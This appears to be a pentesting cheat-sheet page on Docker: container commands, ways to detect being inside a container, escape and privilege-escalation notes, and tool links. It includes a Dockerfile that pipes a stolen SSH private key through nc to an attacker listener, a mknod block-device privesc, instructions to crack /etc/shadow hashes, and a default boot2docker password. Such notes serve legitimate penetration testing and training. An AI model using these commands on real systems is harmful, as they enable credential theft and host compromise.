# Docker

{% embed url="https://pentestbook.six2dez.com/enumeration/cloud/docker-and-and-kubernetes#audit-docker-runtime-and-registries=" %}

## Commands

```bash
# Search in docker hub
docker search wpscan
# Run docker container from docker hub
docker run ubuntu:latest echo "Welcome to Ubuntu"
# Run docker container from docker hub with interactive tty
docker run --name samplecontainer -it ubuntu:latest /bin/bash
# List running containers
docker ps
# List all containers
docker ps -a
# List docker images
docker images
# Run docker in background
docker run --name pingcontainer -d alpine:latest ping 127.0.0.1 -c 50
# Get container logs
docker logs -f pingcontainer
# Run container service in specified port
docker run -d --name nginxalpine -p 7777:80 nginx:alpine
# Access tty of running container
docker exec -it nginxalpine sh
# Get low-level info of docker object
docker inspect (container or image)
# Show image history
docker history jess/htop
# Stop container
docker stop dummynginx
# Remove container
docker rm dummynginx
# Run docker with specified PID namespace
docker run --rm -it --pid=host jess/htop

# Show logs
docker logs containername
docker logs -f containername
# Show service defined logs
docker service logs
# Look generated real time events by docker runtime
docker system events
docker events --since '10m'
docker events --filter 'image=alpine'
docker events --filter 'event=stop'

# Compose application (set up multicontainer docker app)
docker-compose up -d
# List docker volumes
docker volume ls
# Create volume
docker volume create vol1
# List docker networks
docker network ls
# Create docker network
docker network create net1
# Remove capability of container
docker run --rm -it --cap-drop=NET_RAW alpine sh
# Check capabilities inside container
docker run --rm -it 71aa5f3f90dc bash
capsh --print
# Run full privileged container
docker run --rm -it --privileged=true 71aa5f3f90dc bash
capsh --print
# From full privileged container you can access host devices
more /dev/kmsg

# Creating container groups
docker run -d --name='low_priority' --cpuset-cpus=0 --cpu-shares=10 alpine md5sum /dev/urandom
docker run -d --name='high_priority' --cpuset-cpus=0 --cpu-shares=50 alpine md5sum /dev/urandom
# Stopping cgroups
docker stop low_priority high_priority
# Remove cgroups
docker rm low_priority high_priority

# Setup docker swarm cluster
docker swarm init
# Check swarm nodes
docker node ls
# Start new service in cluster
docker service create --replicas 1 --publish 5555:80 --name nginxservice
nginx:alpine
# List services
docker service ls
# Inspect service
docker service inspect --pretty nginxservice
# Remove service
docker service rm nginxservice
# Leave cluster
docker swarm leave (--force if only one node)

# Start portainer
docker run -d -p 9000:9000 --name portainer \
--restart always -v /var/run/docker.sock:/var/run/docker.sock \
-v /opt/portainer:/data portainer/portainer

# Tools
https://github.com/lightspin-tech/red-kube
```

## Escape / breakout&#x20;

| [**https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation**](https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation) |
| ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)                                                                       |
| [https://0xdf.gitlab.io/2021/05/17/digging-into-cgroups.html](https://0xdf.gitlab.io/2021/05/17/digging-into-cgroups.html)                                                                                                               |

{% hint style="danger" %}
It is common if the IP of the docker container is 172.16.0.X and X is not 1, the host IP and **gateway** should be 172.16.0.1 and that is the IP we can communicate to in order to scan ports, to access webservers, etc.

Consider internal ports, other ports seen on host/container to communicate to.

Transfer **nmap** and perform subnetwork scanning and then port scanning.
{% endhint %}

{% code overflow="wrap" fullWidth="true" %}
```bash
############ Detect we are inside a container
Listing everything inside the '/' directory shows a .dockerenv file. This combined with the hostname of several digits (user@0588789748488 for example) means we are likely running inside a docker container.
# OTHER WAYS
- Compare codename "apache http 2.4.X launchpad" or "nginx xxx launchpad" on Google with the one we get when we access the machine, it might differ if we are under a container
- MAC Address
    - Docker uses a range from 02:42:ac:11:00:00 to 02:42:ac:11:ff:ff
- List of running processes (ps aux)
    - Small number of processes generally indicate a container
- CGROUPs
    - cat /proc/1/cgroup – should show docker process running
- Check for existence of docker.sock (ls -al /var/run/docker.sock)
- Check for container capabilities: capsh –print
- On Pentests, check for tcp ports 2375 and 2376 – Default docker daemon ports


############ Communicate with the host
Think about IP, interfaces, gateways...

# If IP is 192.168.120.10, gateway should be 192.168.120.1 so we can use that latter IP to communicate with the host and do for example 
echo '' > /dev/tcp/192.168.120.1/22 # to check if SSH port is open on the host
# Other ways
cat /proc/net/arp
arp -n

If target IP (ifconfig) is not X.X.X.1, precisely X.X.X.1 might be 
the internal docker IP con the host --> check route/arp/gateway w/ route -n

If a user on /home is on the container but not on /etc/passwd, check if there is anly link/connection to write on that folder and write as well on the host or to do sth related


############# Dockerfile
ls Dockerfile # to see if it has sensitive info


############# Mounts
Check if root privileges on the container and no restriction to mount filesystems and partitions.


############# Loot
Check databases, check env variables, .env files and so on.
# if we are root
check /etc/passwd, /etc/shadow and crack hashes
```
{% endcode %}

## boot2docker&#x20;

<pre class="language-sh"><code class="lang-sh">https://github.com/ailispaw/boot2docker-xhyve
<strong>ssh docker@$GATEWAY_IP # password is tcuser
</strong></code></pre>

## Privilege escalation

```sh
https://www.hackingarticles.in/docker-privilege-escalation/
https://flast101.github.io/docker-privesc/

# Sharing block device - privesc when there are docker containers
lsblk # then note MAJ:MIN value from the lvm type, for example it might be 253
mknod /dev/rootfs b $MAJ 0
mknod /dev/rootfs b 253 0
```

## Automatic enumeration & escape

[linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): It can also **enumerate containers**\
[CDK](https://github.com/cdk-team/CDK#installationdelivery): This tool is pretty **useful to enumerate the container you are into even try to escape automatically**\
[amicontained](https://github.com/genuinetools/amicontained): Useful tool to get the privileges the container has in order to find ways to escape from it\
[deepce](https://github.com/stealthcopter/deepce): Tool to enumerate and escape from containers\
[grype](https://github.com/anchore/grype): Get the CVEs contained in the software installed in the image

## docker build Dockerfile

If we can list images or import **alpine** image.

We have to build the container using a **Dockerfile**. That file should be placed where we can run commands or get files like SSH key available in /opt. We place Dockerfile In the **/opt** folder, because we need that context to use files and retrieve that SSH key from that current directory, let's create a **Dockerfile** with the following contents:

```bash
blablah@dep:/opt$ cat Dockerfile 
FROM alpine
COPY id_rsa.bak /tmp/id_rsa.bak
RUN cat /tmp/id_rsa.bak | nc $KALI_IP 80
```

This Dockerfile will allow us to build a new image based off of the `alpine` image. When we build the new image, the **id\_rsa.bak** file will be copied into it and then the contents will be piped out to a listener waiting on our kali machine.

We build the container with the file Dockerfile and set a Netcat connection to catch the SSH key:

```bash
user@hostname:/opt$ sudo docker build -f Dockerfile .
Sending build context to Docker daemon  7.168kB
Step 1/3 : FROM alpine
 ---> d4ff818577bc
Step 2/3 : COPY id_rsa.bak /tmp/id_rsa.bak
 ---> 579dd0db7197
Step 3/3 : RUN cat /tmp/id_rsa.bak | nc 192.168.49.100 80
 ---> Running in 9b48aef85006
Removing intermediate container 9b48aef85006
 ---> 0f7b4e57448a
Successfully built 0f7b4e57448a

└─$ nc -lvnp 80
listening on [any] 80 ...
connect to [] from (UNKNOWN) [] 44583
-----BEGIN OPENSSH PRIVATE KEY-----
...
```

## SQL server test

Need to spin up a quick SQL server for a potential attack or pentest? Docker has got you covered. -p to map the port, -e to set an environment variable, and -d to run as a daemon!

docker run -p 3306:3306 -e MYSQL\_ROOT\_PASSWORD=anythingyouwant -d mysql

![](<../../.gitbook/assets/image (122).png>)
